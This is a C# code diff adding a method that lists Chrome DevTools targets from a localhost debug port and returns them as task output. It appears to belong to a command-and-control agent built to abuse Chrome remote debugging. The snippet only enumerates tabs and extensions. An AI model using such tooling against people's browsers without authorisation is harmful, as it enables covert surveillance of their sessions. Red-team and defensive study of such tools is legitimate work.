@@ -140,6 +140,34 @@ namespace Agent
             }
             return extensions;
         }
+        internal List<ChromeJsonObject> GetEverything(CursedConfig config, string task_id)
+        {
+            List<ChromeJsonObject> extensions = new List<ChromeJsonObject>();
+            using (HttpClient client = new HttpClient())
+            {
+                try
+                {
+                    // Fetch list of targets from DevTools Protocol
+                    string targetsUrl = $"http://localhost:{config.debug_port}/json/list";
+                    string targetsJson = client.GetStringAsync(targetsUrl).Result;
+
+                    if (this.config.debug)
+                    {
+                        ReturnOutput(targetsJson, task_id);
+                    }
+
+                    List<ChromeJsonObject> targets = JsonSerializer.Deserialize<List<ChromeJsonObject>>(targetsJson);
+
+
+                    return targets;
+                }
+                catch (Exception e)
+                {
+                    ReturnOutput(e.ToString(), task_id);
+                }
+            }
+            return new List<ChromeJsonObject>();
+        }
         internal ExtensionManifest GetManifestFromExtension(ChromeJsonObject extension, string task_id)
         {
             if (this.config.debug)
